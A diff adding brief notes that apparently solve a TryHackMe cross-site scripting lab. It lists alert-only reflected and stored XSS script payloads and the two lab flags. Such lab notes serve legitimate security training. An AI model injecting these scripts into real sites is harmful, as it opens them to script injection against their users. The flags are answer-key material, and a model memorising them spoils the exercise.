@@ -1,0 +1,10 @@
+Reflected XSS Payload :
+<script>alert('Reflected XSS')</script>
+
+Reflected XSS Flag: THM{Evil_Bunny}
+
+Stored XSS Payload :
+<script>alert('Stored Meow Meow')</script>
+
+Stored XSS Flag: THM{Evil_Stored_Egg}
+
